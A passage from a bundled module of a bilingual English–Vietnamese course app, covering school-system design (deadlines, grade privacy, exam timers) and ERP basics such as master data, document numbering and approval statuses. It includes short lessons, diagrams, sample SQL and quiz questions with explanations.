VI: Giáo viên ở Hà Nội đặt hạn "23:59". Học sinh ở Paris cũng thấy "23:59" và nộp lúc 23:30 giờ Paris. Hệ thống đánh dấu nộp muộn. Vì sao?`,choices:["The app shows the deadline without converting time zones","The upload was too slow and finished after midnight","The server clock is several hours ahead of real time","The student’s device clock was set wrong"],answer:0,why:`23:30 in Paris is already the next morning in Hanoi. The app must convert the deadline to the student’s local time, or label the zone clearly.
VI: 23:30 ở Paris đã là sáng hôm sau ở Hà Nội. Ứng dụng phải đổi hạn nộp sang giờ địa phương của học sinh, hoặc ghi rõ múi giờ.`},{id:"education.lms-privacy.2",kind:"truefalse",difficulty:"easy",prompt:`The submission time should come from the student’s device, because it is closest to the student.
VI: Thời gian nộp bài nên lấy từ thiết bị của học sinh, vì nó gần học sinh nhất.`,choices:["True","False"],answer:1,why:`A device clock can be wrong or changed on purpose. The server clock is the one source everyone can trust.
VI: Đồng hồ thiết bị có thể sai hoặc bị cố ý chỉnh. Đồng hồ máy chủ là nguồn duy nhất mọi người có thể tin.`},{id:"education.lms-privacy.3",kind:"scenario",difficulty:"medium",prompt:`A parent asks the school app to show the grades of a classmate who "is my son’s best friend". What should the system do?
VI: Phụ huynh đề nghị ứng dụng cho xem điểm của một bạn cùng lớp "là bạn thân của con tôi". Hệ thống nên làm gì?`,choices:["Refuse, parents see only their own linked children","Allow it if both students are in the same class","Allow it if the other parent is in the group chat","Show the average only, not each single score"],answer:0,why:`Grades are personal data about a child. Access comes from a recorded parent–child link, not from friendship or class.
VI: Điểm số là dữ liệu cá nhân của trẻ. Quyền xem đến từ liên kết phụ huynh – học sinh đã được ghi nhận, không phải từ tình bạn hay cùng lớp.`},{id:"education.lms-privacy.4",kind:"compare",difficulty:"hard",prompt:`A 45-minute online exam. Design A: the browser counts down and submits at zero. Design B: the server saves the start time and rejects answers after 45 minutes. Which is better?
VI: Bài thi trực tuyến 45 phút. Thiết kế A: trình duyệt đếm ngược và tự nộp khi hết giờ. Thiết kế B: máy chủ lưu giờ bắt đầu và từ chối đáp án sau 45 phút. Cách nào tốt hơn?`,choices:["B, because the student cannot change the server clock","A, because it still works when the internet is slow","Both are equal if the browser timer is correct","A, because the server is too busy during exams"],answer:0,why:`Browser code can be paused or changed by the student. Show the countdown in the browser, but let the server decide. Allow a small grace period for slow networks.
VI: Mã trên trình duyệt có thể bị học sinh tạm dừng hoặc sửa. Vẫn hiện đồng hồ trên trình duyệt, nhưng để máy chủ quyết định, có thêm ít thời gian bù cho mạng chậm.`}]}],cheatSheet:[{title:"School structure · Cơ cấu nhà trường",items:[{term:"School year · Năm học",meaning:`The top time unit. Classes and fee plans belong to one year.
VI: Đơn vị thời gian lớn nhất. Lớp và biểu phí gắn với một năm học.`},{term:"Semester · Học kỳ",meaning:`Part of a school year. Grades and teaching are planned per semester.
VI: Một phần của năm học. Điểm và phân công giảng dạy lập theo học kỳ.`},{term:"Class · Lớp",meaning:`A group of students in one grade level and one school year.
VI: Một nhóm học sinh thuộc một khối, trong một năm học.`},{term:"Homeroom teacher · Giáo viên chủ nhiệm",meaning:`The main teacher in charge of one class.
VI: Giáo viên chính phụ trách một lớp.`},{term:"Teaching assignment · Phân công giảng dạy",meaning:`Who teaches which subject to which class, in which semester.
VI: Ai dạy môn gì, cho lớp nào, trong học kỳ nào.`},{term:"Class enrollment · Xếp lớp",meaning:`Student in a class with FromDate and ToDate, so moves keep history.
VI: Học sinh thuộc lớp kèm ngày từ và ngày đến, để chuyển lớp vẫn giữ lịch sử.`}]},{title:"Admission and timetable · Tuyển sinh và thời khóa biểu",items:[{term:"Application · Hồ sơ đăng ký",meaning:`A request to join. It becomes a student only when enrolled.
VI: Yêu cầu vào học. Chỉ thành học sinh khi đã nhập học.`},{term:"Quota · Chỉ tiêu",meaning:`The number of seats available.
VI: Số chỗ được tuyển.`},{term:"Waitlist · Danh sách chờ",meaning:`A ranked queue for seats that free up later.
VI: Hàng chờ xếp thứ tự cho những chỗ trống về sau.`},{term:"Prerequisite · Học phần tiên quyết",meaning:`A course the student must pass before taking another.
VI: Học phần sinh viên phải đạt trước khi học học phần khác.`},{term:"Hard constraint · Ràng buộc cứng",meaning:`A rule that must never break, like one teacher in one place per period.
VI: Quy tắc không được vi phạm, như mỗi giáo viên chỉ ở một nơi mỗi tiết.`},{term:"Substitution · Dạy thay",meaning:`A dated row saying who really taught instead of the planned teacher.
VI: Dòng có ngày cho biết ai đã thực sự dạy thay giáo viên theo lịch.`}]},{title:"Attendance and grades · Chuyên cần và điểm số",items:[{term:"Absent with permission · Vắng có phép",meaning:`An absence backed by an approved parent note.
VI: Buổi vắng có đơn xin phép của phụ huynh đã được duyệt.`},{term:"Absence limit · Giới hạn vắng",meaning:`A rule like "over 20% absent means no final exam". Ask for the number.
VI: Quy định như "vắng quá 20% thì cấm thi". Phải hỏi con số cụ thể.`},{term:"Weight · Hệ số",meaning:`How much a score component counts in the average.
VI: Mức độ một điểm thành phần được tính trong điểm trung bình.`},{term:"Weighted average · Trung bình có hệ số",meaning:`Sum of score × weight, divided by the sum of weights.
VI: Tổng điểm × hệ số, chia cho tổng hệ số.`},{term:"GPA · Điểm trung bình tích lũy",meaning:`Course points weighted by credits.
VI: Điểm học phần tính trọng số theo số tín chỉ.`},{term:"Regrade request · Đơn phúc khảo",meaning:`The approved, logged way to change a published grade.
VI: Cách sửa điểm đã công bố, có duyệt và có nhật ký.`}]},{title:"Fees and LMS · Học phí và LMS",items:[{term:"Fee plan · Biểu phí",meaning:`Fee items with amounts and due dates for a program.
VI: Các khoản thu kèm số tiền và hạn nộp của một chương trình.`},{term:"Installment · Đợt nộp",meaning:`One part of the total fee with its own due date.
VI: Một phần của tổng học phí, có hạn nộp riêng.`},{term:"Accounts receivable · Công nợ phải thu",meaning:`Money families still owe: charges minus payments.
VI: Số tiền gia đình còn nợ: khoản phải thu trừ tiền đã nộp.`},{term:"Refund · Hoàn phí",meaning:`Money paid back after withdrawal, stored as a new line.
VI: Tiền trả lại khi thôi học, lưu thành một dòng mới.`},{term:"Deadline in UTC · Hạn nộp theo UTC",meaning:`Store in UTC, show in local time, judge by server time.
VI: Lưu theo UTC, hiển thị giờ địa phương, xét theo giờ máy chủ.`},{term:"Role-based access · Phân quyền theo vai trò",meaning:`Teachers see their classes, parents see only their own children.
VI: Giáo viên xem lớp mình dạy, phụ huynh chỉ xem con mình.`}]}]},R=Object.freeze(Object.defineProperty({__proto__:null,default:D},Symbol.toStringTag,{value:"Module"})),E={id:"erp",group:"domain",title:"ERP Basics",emoji:"🏢",tagline:`One system for the whole company — how business software is built
VI: Một hệ thống cho cả công ty — phần mềm doanh nghiệp được xây dựng thế nào`,lessons:[{id:"erp.what-is-erp",title:"What an ERP is · ERP là gì",summary:`One system and one database for the whole company.
VI: Một hệ thống và một cơ sở dữ liệu cho cả công ty.`,minutes:4,blocks:[{type:"text",text:`ERP means **Enterprise Resource Planning**. It is one system that runs the main work of a company.
VI: ERP là viết tắt của **Enterprise Resource Planning** (hoạch định nguồn lực doanh nghiệp). Đó là một hệ thống chạy các nghiệp vụ chính của cả công ty.
Each department uses its own **module**, that is, one part of the system. All modules share **one database**, so everyone sees the same numbers.
VI: Mỗi phòng ban dùng một **phân hệ** (module) riêng. Tất cả phân hệ dùng chung **một cơ sở dữ liệu**, nên mọi người thấy cùng một số liệu.`},{type:"diagram",text:`  Sales     Purchasing    Inventory
 (Bán hàng)  (Mua hàng)     (Kho)
    │           │             │
    └───────────┼─────────────┘
                ▼
      ┌───────────────────┐
      │   ONE DATABASE    │
      │ customers, items, │
      │ orders, invoices  │
      └───────────────────┘
                ▲
    ┌───────────┼─────────────┐
    │           │             │
 Production  Accounting       HR
 (Sản xuất)  (Kế toán)    (Nhân sự)`},{type:"diagram",text:`Sale: 5 chairs × 1,000,000 VND
   │
   ├──► Inventory (Kho)
   │      stock of chairs: 50 → 45
   │
   ├──► Accounting (Kế toán)
   │      revenue     + 5,000,000
   │      receivable  + 5,000,000
   │
   └──► Sales report
          chairs sold today: 5`},{type:"text",text:`One business event updates many modules at once. Nobody retypes the sale into a stock file or an accounting file. A **receivable** is money the customer still owes. VAT is left out here to keep it simple.
VI: Một nghiệp vụ cập nhật nhiều phân hệ cùng lúc. Không ai phải nhập lại đơn bán vào file kho hay file kế toán. **Công nợ phải thu** là số tiền khách hàng còn nợ. Ví dụ này bỏ qua thuế GTGT cho đơn giản.`},{type:"example",title:"Before and after ERP · Trước và sau ERP",text:`A furniture shop keeps sales in one Excel file and stock in another. Sales promises 10 chairs that were sold yesterday. The accountant retypes invoices at month end and makes typos. With an ERP, the sale, the stock and the invoice live in one place.
VI: Một cửa hàng nội thất ghi bán hàng ở một file Excel, tồn kho ở file khác. Nhân viên bán hàng hứa giao 10 ghế đã bán từ hôm qua. Cuối tháng kế toán gõ lại hóa đơn và gõ sai. Có ERP, đơn bán, tồn kho và hóa đơn nằm cùng một chỗ.`},{type:"compare",left:{title:"Buy (SAP, Odoo, Dynamics 365, MISA)",items:[`Standard processes are ready and tested
VI: Quy trình chuẩn đã có sẵn và được kiểm thử`,`Faster to start using
VI: Bắt đầu dùng nhanh hơn`,`The vendor ships updates and fixes
VI: Nhà cung cấp lo cập nhật và sửa lỗi`,`You adapt to its way of working
VI: Công ty phải theo cách làm của phần mềm`]},right:{title:"Build your own",items:[`Fits unique processes exactly
VI: Khớp đúng quy trình đặc thù`,`Slow and costly to build
VI: Làm lâu và tốn kém`,`You own every bug and every update
VI: Tự gánh mọi lỗi và mọi lần nâng cấp`,`Common mix: buy the core, build add-ons
VI: Cách hay gặp: mua phần lõi, tự làm phần mở rộng`]}},{type:"text",text:`Few companies build an ERP from zero. Developers usually configure a bought ERP, extend it and connect it to other systems.
VI: Rất ít công ty tự viết ERP từ đầu. Lập trình viên thường cấu hình ERP đã mua, viết thêm phần mở rộng và kết nối nó với các hệ thống khác.`}],remember:`ERP = one shared database and many modules, so one business event updates them all.
VI: ERP = một cơ sở dữ liệu chung và nhiều phân hệ, nên một nghiệp vụ cập nhật tất cả.`,questions:[{id:"erp.what-is-erp.1",kind:"mcq",difficulty:"easy",prompt:`What is the core idea of an ERP system?
VI: Ý tưởng cốt lõi của một hệ thống ERP là gì?`,choices:[`Each department keeps its own separate database
VI: Mỗi phòng ban giữ cơ sở dữ liệu riêng`,`All departments work on one shared database
VI: Mọi phòng ban làm việc trên một cơ sở dữ liệu chung`,`It is a report tool that reads many Excel files
VI: Đó là công cụ báo cáo đọc nhiều file Excel`,`It is accounting software and nothing more
VI: Đó chỉ là phần mềm kế toán, không hơn`],answer:1,why:`ERP puts sales, stock, purchasing, accounting and HR on one database. That is why one event can update every module without retyping.
VI: ERP đặt bán hàng, kho, mua hàng, kế toán và nhân sự trên một cơ sở dữ liệu. Nhờ vậy một nghiệp vụ cập nhật được mọi phân hệ mà không phải nhập lại.`},{id:"erp.what-is-erp.2",kind:"scenario",difficulty:"medium",prompt:`Sales and the warehouse use separate Excel files. Sales often promises goods that are already gone. How does an ERP fix this?
VI: Phòng bán hàng và kho dùng hai file Excel riêng. Bán hàng hay hứa giao hàng đã hết. ERP giải quyết việc này thế nào?`,choices:[`The warehouse emails a stock file to sales each morning
VI: Kho gửi email file tồn kho cho bán hàng mỗi sáng`,`Sales gets a bigger Excel file with more columns
VI: Bán hàng dùng file Excel lớn hơn, nhiều cột hơn`,`Sales sees live stock from the same database
VI: Bán hàng xem tồn kho thực tế từ cùng cơ sở dữ liệu`,`The warehouse checks stock again before each delivery
VI: Kho kiểm tra lại tồn kho trước mỗi lần giao`],answer:2,why:`The real problem is two copies of the same data. A morning email is still a copy, and it is old an hour later. One shared database removes the copy.
VI: Vấn đề thật là có hai bản sao của cùng dữ liệu. Email buổi sáng vẫn là bản sao, một giờ sau đã cũ. Một cơ sở dữ liệu chung bỏ được bản sao đó.`},{id:"erp.what-is-erp.3",kind:"compare",difficulty:"medium",prompt:`A trading company of 30 people has normal sales, purchasing and accounting. Which approach is usually better?
VI: Một công ty thương mại 30 người có bán hàng, mua hàng, kế toán bình thường. Cách nào thường tốt hơn?`,choices:[`Build a custom ERP from zero in-house
VI: Tự viết ERP riêng từ đầu`,`Buy a standard ERP and configure it
VI: Mua ERP có sẵn rồi cấu hình`,`Keep Excel files and share them by email
VI: Giữ file Excel và gửi qua email`],answer:1,why:`Standard processes are already built and tested in a packaged ERP. Building from zero takes years, and you own every bug. Build only the parts that are truly unique.
VI: Quy trình chuẩn đã được làm sẵn và kiểm thử trong ERP đóng gói. Tự viết từ đầu tốn nhiều năm và tự gánh mọi lỗi. Chỉ tự làm phần thực sự đặc thù.`},{id:"erp.what-is-erp.4",kind:"debug",difficulty:"hard",prompt:`A developer adds a custom "Quick sale" screen. Stock goes down correctly. But accounting shows no revenue for these sales. What is the most likely cause?
VI: Lập trình viên thêm màn hình "Bán nhanh". Tồn kho giảm đúng. Nhưng kế toán không thấy doanh thu của các đơn này. Nguyên nhân khả năng cao nhất là gì?`,choices:[`Accounting only refreshes its numbers once each month
VI: Kế toán chỉ cập nhật số liệu mỗi tháng một lần`,`The database cannot save two modules in one transaction
VI: Cơ sở dữ liệu không lưu được hai phân hệ trong một giao dịch`,`Revenue is never stored in the ERP database
VI: Doanh thu không bao giờ được lưu trong ERP`,`The screen updates stock directly and skips posting
VI: Màn hình sửa thẳng tồn kho và bỏ qua bước ghi sổ`],answer:3,why:`In an ERP, one standard step creates both the stock movement and the accounting entry. This step is called **posting** (ghi sổ). Custom code that writes tables directly skips it, so the modules stop agreeing.
VI: Trong ERP, một bước chuẩn tạo cả phát sinh kho lẫn bút toán kế toán. Bước này gọi là **ghi sổ** (posting). Code tự viết sửa thẳng bảng sẽ bỏ qua bước đó, nên các phân hệ bị lệch số.`}]},{id:"erp.master-data",title:"Master data vs transaction data · Dữ liệu danh mục và dữ liệu giao dịch",summary:`Things that stay versus events that happen.
VI: Những đối tượng ít thay đổi và những nghiệp vụ phát sinh hằng ngày.`,minutes:4,blocks:[{type:"text",text:`**Master data** describes the things a company works with. It changes rarely and is used again and again. Examples: customers, suppliers, items, warehouses, accounts.
VI: **Dữ liệu danh mục** (master data) mô tả các đối tượng công ty làm việc cùng. Nó ít thay đổi và được dùng lại nhiều lần. Ví dụ: khách hàng, nhà cung cấp, vật tư hàng hóa, kho, tài khoản kế toán.
**Transaction data** records events. Each order, invoice or stock movement happens once, on a date, and points to master data.
VI: **Dữ liệu giao dịch** (transaction data) ghi lại các nghiệp vụ phát sinh. Mỗi đơn hàng, hóa đơn hay phiếu nhập xuất kho xảy ra một lần, có ngày, và trỏ tới dữ liệu danh mục.`},{type:"diagram",text:`MASTER DATA            TRANSACTION DATA
(danh mục)             (giao dịch)
┌───────────────┐
│ Customer C001 │◄─┐   ┌───────────────┐
│ An Phat Co.   │  └───┤ SO-2026-00015 │
└───────────────┘      │ cust:  C001   │
┌───────────────┐  ┌───┤ item:  CH01   │
│ Item CH01     │◄─┘   │ qty:   5      │
│ Office chair  │      └───────────────┘
└───────────────┘
 few rows, reused      many rows, new
                       row for each event`},{type:"example",title:"Duplicate customers · Khách hàng bị trùng",text:`Sales creates "Công ty An Phát" and later "Cty An Phát". Both have the same tax code. Now the debt is split across two records. Nobody sees the real total the customer owes.
VI: Bán hàng tạo "Công ty An Phát" rồi sau đó lại tạo "Cty An Phát". Cả hai cùng mã số thuế. Công nợ phải thu bị chia ra hai mã. Không ai thấy tổng số khách thật sự còn nợ.`},{type:"list",items:["Each record has a unique code, such as `C001` or `CH01`.\nVI: Mỗi bản ghi có mã duy nhất, ví dụ `C001` hoặc `CH01`.",`Check for duplicates on create, for example by tax code.
VI: Kiểm tra trùng khi tạo mới, ví dụ theo mã số thuế.`,`One team owns each list and approves changes.
VI: Mỗi danh mục có một bộ phận chịu trách nhiệm và duyệt thay đổi.`,`Required fields are really required: unit, tax rate, account.
VI: Trường bắt buộc phải thật sự bắt buộc: đơn vị tính, thuế suất, tài khoản.`]},{type:"text",text:`Never delete master data that transactions use. Old invoices still need that customer. Mark it **inactive** instead. It stays for history but is hidden when creating new documents.
VI: Không xóa dữ liệu danh mục đã có giao dịch dùng tới. Hóa đơn cũ vẫn cần khách hàng đó. Hãy đánh dấu **ngừng theo dõi** (inactive). Bản ghi vẫn giữ cho lịch sử nhưng bị ẩn khi lập chứng từ mới.`},{type:"code",code:{lang:"sql",text:`-- Do not: DELETE FROM Items WHERE Code = 'CH01';
UPDATE Items SET IsActive = 0
WHERE Code = 'CH01';

-- New order screen: active items only
SELECT Code, Name FROM Items
WHERE IsActive = 1;

-- Old invoices still join to CH01: nothing breaks`}},{type:"text",text:`Documents also copy key values at that moment: item name, price, tax rate. A later change to master data must not rewrite old invoices.
VI: Chứng từ cũng lưu lại các giá trị chính tại thời điểm lập: tên hàng, đơn giá, thuế suất. Sửa danh mục về sau không được làm thay đổi hóa đơn cũ.`}],remember:`Master data is reused everywhere, so keep it clean and never delete it once it is used.
VI: Dữ liệu danh mục được dùng khắp nơi, nên phải giữ sạch và không xóa khi đã phát sinh giao dịch.`,questions:[{id:"erp.master-data.1",kind:"mcq",difficulty:"easy",prompt:`Which one is **master data**?
VI: Cái nào là **dữ liệu danh mục**?`,choices:["Invoice INV-2026-00042","Goods receipt of 50 chairs",'Item CH01 "Office chair"',"Payment of 12,000,000 VND"],answer:2,why:`An item is a thing that is reused in many documents. The invoice, the goods receipt and the payment are events, so they are transaction data.
VI: Mặt hàng là đối tượng được dùng lại trong nhiều chứng từ. Hóa đơn, phiếu nhập kho và khoản thanh toán là nghiệp vụ phát sinh, nên là dữ liệu giao dịch.`},{id:"erp.master-data.2",kind:"scenario",difficulty:"medium",prompt:`Two customer records have the same tax code: "Công ty An Phát" and "Cty An Phát". The debt report shows 80M VND on one and 50M VND on the other. What is the best fix?
VI: Hai mã khách hàng cùng mã số thuế: "Công ty An Phát" và "Cty An Phát". Báo cáo công nợ hiện 80 triệu ở mã này và 50 triệu ở mã kia. Cách sửa tốt nhất là gì?`,choices:[`Merge them into one customer and block duplicate tax codes
VI: Gộp thành một khách hàng và chặn trùng mã số thuế`,`Delete the newer record and its invoices from the database
VI: Xóa mã khách mới hơn cùng các hóa đơn của nó`,`Ask accounting to add the two numbers by hand each month
VI: Nhờ kế toán tự cộng hai số mỗi tháng`,`Rename the second one so the two names look different
VI: Đổi tên mã thứ hai để hai tên trông khác nhau`],answer:0,why:`The real customer owes 130M VND, but no report shows it. Merge the records and stop new duplicates at the source. Deleting would destroy real invoices.
VI: Khách thật sự nợ 130 triệu nhưng không báo cáo nào thể hiện. Hãy gộp mã và chặn trùng ngay từ lúc nhập. Xóa sẽ làm mất hóa đơn thật.`},{id:"erp.master-data.3",kind:"debug",difficulty:"medium",prompt:`After a data "clean-up", some invoices from 2025 fail to open with the error "Item not found". What most likely happened?
VI: Sau một đợt "dọn dữ liệu", một số hóa đơn năm 2025 không mở được, báo lỗi "Không tìm thấy mặt hàng". Khả năng cao chuyện gì đã xảy ra?`,choices:[`The invoices are too old for the database to read
VI: Hóa đơn quá cũ nên cơ sở dữ liệu không đọc được`,`Old items were deleted for good while invoices used them
VI: Mặt hàng cũ bị xóa hẳn trong khi hóa đơn vẫn dùng`,`The item names were changed to upper case
VI: Tên mặt hàng bị đổi sang chữ in hoa`,`The 2025 period was locked by accounting
VI: Kỳ kế toán năm 2025 đã bị khóa sổ`],answer:1,why:`The invoices point to item rows that no longer exist. A foreign key (a rule that the linked row must exist) would have blocked the delete. The right clean-up is to mark old items inactive.
VI: Hóa đơn trỏ tới dòng mặt hàng không còn tồn tại. Khóa ngoại (foreign key) lẽ ra đã chặn lệnh xóa. Cách dọn đúng là đánh dấu ngừng theo dõi.`},{id:"erp.master-data.4",kind:"truefalse",difficulty:"hard",prompt:`Marketing renames item CH01 from "Office chair" to "Ergo chair". The invoice issued last year should now show "Ergo chair".
VI: Marketing đổi tên mặt hàng CH01 từ "Office chair" thành "Ergo chair". Hóa đơn phát hành năm ngoái giờ phải hiện "Ergo chair".`,choices:["True","False"],answer:1,why:`An issued invoice is a legal record of what was sold at that time. The invoice line keeps its own copy of the name and price. Only new documents use the new name.
VI: Hóa đơn đã phát hành là chứng từ pháp lý về việc bán tại thời điểm đó. Dòng hóa đơn giữ bản sao tên hàng và đơn giá riêng. Chỉ chứng từ mới dùng tên mới.`}]},{id:"erp.documents",title:"Documents and numbering · Chứng từ và đánh số",summary:`Every business event is a numbered document.
VI: Mỗi nghiệp vụ là một chứng từ có số.`,minutes:4,blocks:[{type:"text",text:`In an ERP, every business event is a **document** (chứng từ). Examples: quote, order, delivery note, invoice, payment. A document has a **header** (customer, date) and **lines** (item, quantity, price).
VI: Trong ERP, mỗi nghiệp vụ là một **chứng từ**. Ví dụ: báo giá, đơn hàng, phiếu xuất kho, hóa đơn, phiếu thu. Chứng từ có **phần đầu** (khách hàng, ngày) và **các dòng chi tiết** (hàng, số lượng, đơn giá).`},{type:"diagram",text:`   SO - 2026 - 00001
   │     │       │
   │     │       └─ running number
   │     └─ year: restarts at 00001
   └─ type: SO = sales order

Other series (dãy số khác):
   QT-2026-00001    quote
   DN-2026-00001    delivery note
   INV-2026-00001   invoice`},{type:"text",text:`Each document type has its own **number series** (dãy số). The number is unique and easy to say on a phone call. It also shows the type and the year.
VI: Mỗi loại chứng từ có **dãy số** riêng. Số chứng từ là duy nhất và dễ đọc qua điện thoại. Nó còn cho biết loại chứng từ và năm.`},{type:"diagram",text:`QT-2026-00007   Quote (báo giá)
      │ copy
      ▼
SO-2026-00015   Sales order (đơn bán)
      │ copy      100 chairs
      ▼
DN-2026-00021   Delivery (phiếu xuất kho)
      │ copy      60 chairs, 40 left
      ▼
INV-2026-00042  Invoice (hóa đơn)
                  60 chairs`},{type:"text",text:`**Copy, do not retype.** Create the next document from the previous one. The ERP copies the customer, items and prices, and stores a link to the source. That link shows what is left to deliver or invoice.
VI: **Sao chép, đừng gõ lại.** Lập chứng từ sau từ chứng từ trước. ERP chép khách hàng, mặt hàng, đơn giá và lưu liên kết tới chứng từ gốc. Liên kết đó cho biết còn bao nhiêu chưa giao, chưa xuất hóa đơn.`},{type:"example",title:"Partial delivery · Giao hàng từng phần",text:`A customer orders 100 chairs. The warehouse has 60, so it delivers 60 today. The order line now shows 60 delivered and 40 open. Next week, a second delivery is copied from the same order for the last 40.
VI: Khách đặt 100 ghế. Kho chỉ có 60 nên hôm nay giao 60. Dòng đơn hàng hiện đã giao 60, còn lại 40. Tuần sau, phiếu xuất thứ hai được lập từ chính đơn đó cho 40 ghế còn lại.`},{type:"code",code:{lang:"sql",text:`SELECT o.No, l.ItemCode, l.Qty,
       l.DeliveredQty,
       l.Qty - l.DeliveredQty AS OpenQty
FROM SalesOrders o
JOIN SalesOrderLines l ON l.OrderId = o.Id;
-- SO-2026-00015  CH01  100  60  40`}},{type:"text",text:"Do not use a database `IDENTITY` column as the document number. A failed insert can use up a number and leave a gap. Use a numbering table, updated in the same transaction.\nVI: Đừng dùng cột `IDENTITY` của cơ sở dữ liệu làm số chứng từ. Lệnh insert bị lỗi có thể dùng mất một số và để lại lỗ hổng. Hãy dùng bảng đánh số, cập nhật trong cùng giao dịch."}],remember:`One event = one numbered document, created by copying the previous one in the chain.
VI: Một nghiệp vụ = một chứng từ có số, lập bằng cách sao chép từ chứng từ trước trong chuỗi.`,questions:[{id:"erp.documents.1",kind:"mcq",difficulty:"easy",prompt:"Why do ERPs use numbers like `SO-2026-00015` instead of a plain `15`?\nVI: Vì sao ERP dùng số như `SO-2026-00015` thay vì chỉ là `15`?",choices:[`Longer numbers make database queries run faster
VI: Số dài hơn giúp truy vấn chạy nhanh hơn`,`The law requires every number to contain letters
VI: Luật bắt buộc mọi số phải có chữ cái`,`It shows type and year, and each series counts alone
VI: Số cho biết loại và năm, mỗi dãy tự đếm riêng`,`It hides how many orders the company really has
VI: Để che giấu số lượng đơn thật của công ty`],answer:2,why:`People read the type and year at a glance. Each type and year has its own counter, so sales orders and invoices do not mix.
VI: Người dùng nhìn là biết loại và năm. Mỗi loại và mỗi năm có bộ đếm riêng, nên đơn bán và hóa đơn không lẫn nhau.`},{id:"erp.documents.2",kind:"scenario",difficulty:"medium",prompt:`An accountant creates invoices by retyping data from the sales order. Last month, two invoices had the wrong price. What should the system do?
VI: Kế toán lập hóa đơn bằng cách gõ lại từ đơn bán hàng. Tháng trước có hai hóa đơn sai giá. Hệ thống nên làm gì?`,choices:[`Add a second person who retypes and compares each invoice
VI: Thêm người thứ hai gõ lại và đối chiếu từng hóa đơn`,`Show a warning that tells the user to type more carefully
VI: Hiện cảnh báo nhắc người dùng gõ cẩn thận hơn`,`Let the accountant change prices freely on any invoice
VI: Cho kế toán tự do sửa giá trên mọi hóa đơn`,`Create the invoice from the order or delivery by copying
VI: Lập hóa đơn bằng cách sao chép từ đơn hàng hoặc phiếu xuất`],answer:3,why:`Copying removes the typing step, so the typo cannot happen. It also keeps the link, so the system knows what is already invoiced.
VI: Sao chép bỏ bước gõ tay, nên không thể gõ sai. Nó còn giữ liên kết, nên hệ thống biết phần nào đã xuất hóa đơn.`},{id:"erp.documents.3",kind:"debug",difficulty:"hard",prompt:"Invoice numbers come from an `IDENTITY` column. The auditor finds gaps: 00041, 00043, 00044. No invoice was deleted. What is the most likely cause?\nVI: Số hóa đơn lấy từ cột `IDENTITY`. Kiểm toán thấy số bị nhảy: 00041, 00043, 00044. Không hóa đơn nào bị xóa. Nguyên nhân khả năng cao nhất là gì?",choices:[`A failed or rolled-back insert used up number 00042
VI: Một lệnh insert lỗi hoặc bị rollback đã dùng mất số 00042`,`The server clock was wrong when 00042 was created
VI: Đồng hồ máy chủ bị sai khi tạo số 00042`,`The database stores invoice numbers in random order
VI: Cơ sở dữ liệu lưu số hóa đơn theo thứ tự ngẫu nhiên`,`Two users opened the invoice screen at the same time
VI: Hai người dùng mở màn hình hóa đơn cùng lúc`],answer:0,why:"`IDENTITY` values are not given back when a transaction rolls back. Use a numbering table updated inside the same transaction. Ask the business if gaps are allowed for this document type.\nVI: Giá trị `IDENTITY` không được trả lại khi giao dịch bị rollback. Hãy dùng bảng đánh số cập nhật trong cùng giao dịch. Hỏi nghiệp vụ xem loại chứng từ này có được phép nhảy số không."},{id:"erp.documents.4",kind:"code",difficulty:"medium",prompt:`Order SO-2026-00015 has only this line. What should the order status be?
VI: Đơn SO-2026-00015 chỉ có dòng này. Trạng thái đơn nên là gì?`,code:{lang:"json",text:`{
  "item": "CH01",
  "qty": 100,
  "deliveredQty": 60,
  "invoicedQty": 60
}`},choices:["Delivered in full","Partially delivered","Not delivered yet","Closed and invoiced"],answer:1,why:`60 of 100 chairs are delivered, so 40 are still open. The order stays open until the last 40 are delivered or the rest is cancelled.
VI: Đã giao 60 trên 100 ghế, còn 40 chưa giao. Đơn vẫn mở cho đến khi giao nốt 40 ghế hoặc hủy phần còn lại.`}]},{id:"erp.status-approval",title:"Status and approval · Trạng thái và phê duyệt",summary:`Draft, approve, post, and how to undo safely.
VI: Nháp, duyệt, ghi sổ, và cách sửa sai an toàn.`,minutes:5,blocks:[{type:"text",text:`A document moves through **statuses**. Each status says what is allowed next. **Posted** (đã ghi sổ) means the document has changed stock or the accounting books.
VI: Chứng từ đi qua các **trạng thái**. Mỗi trạng thái quy định bước tiếp theo được làm gì. **Đã ghi sổ** (posted) nghĩa là chứng từ đã làm thay đổi tồn kho hoặc sổ kế toán.`},{type:"diagram",text:`  ┌───────────┐
  │ Draft     │ edit freely, delete OK
  └─────┬─────┘
        │ submit
        ▼
  ┌───────────┐ reject
  │ Submitted │───────► back to Draft
  └─────┬─────┘
        │ approve
        ▼
  ┌───────────┐ cancel
  │ Approved  │───────► Cancelled
  └─────┬─────┘
        │ post: stock and books change
        ▼
  ┌───────────┐
  │ Posted    │ locked: reverse only
  └───────────┘`},{type:"text",text:`Approval often depends on the amount. Here is an example for a **PO**, that is, a purchase order (đơn mua hàng). The limits are only an example.
VI: Việc phê duyệt thường phụ thuộc số tiền. Dưới đây là ví dụ cho **đơn mua hàng** (PO). Các hạn mức chỉ là ví dụ.`},{type:"diagram",text:`Approval limits (hạn mức phê duyệt)
┌───────────────────┬──────────────┐
│ PO amount (VND)   │ Approver     │
├───────────────────┼──────────────┤
│ up to 20,000,000  │ Team lead    │
│ up to 200,000,000 │ Manager      │
│ above 200,000,000 │ Director     │
└───────────────────┴──────────────┘`},{type:"list",items:[`**Delete**: only for drafts. Nothing has happened yet, so nothing is lost.
VI: **Xóa**: chỉ cho chứng từ nháp. Chưa có gì phát sinh nên không mất gì.`,`**Cancel**: for approved documents that are not posted. The row stays, with status Cancelled.
VI: **Hủy**: cho chứng từ đã duyệt nhưng chưa ghi sổ. Dòng dữ liệu vẫn còn, trạng thái là Đã hủy.`,`**Reverse**: for posted documents. Create a new document with the opposite effect.
VI: **Đảo** (reverse): cho chứng từ đã ghi sổ. Tạo một chứng từ mới có tác động ngược lại.`]},{type:"example",title:"Wrong quantity · Nhập sai số lượng",text:`A goods receipt was posted with 100 boxes instead of 10. Stock quantity and stock value are now wrong. Do not edit the posted receipt. Post a reversal for 100, then a new receipt for 10. The history shows all three steps.
VI: Phiếu nhập kho đã ghi sổ 100 thùng thay vì 10. Số lượng và giá trị tồn kho đều sai. Đừng sửa phiếu đã ghi sổ. Ghi một chứng từ đảo 100 thùng, rồi lập phiếu nhập mới 10 thùng. Lịch sử thấy đủ cả ba bước.`},{type:"code",code:{lang:"ts",text:`type Status = 'Draft' | 'Submitted'
  | 'Approved' | 'Posted' | 'Cancelled';

// Allow-list: name the safe statuses
function canEdit(s: Status): boolean {
  return s === 'Draft';
}`}}],remember:`Only drafts are edited or deleted; posted documents are fixed with a new reversing document.
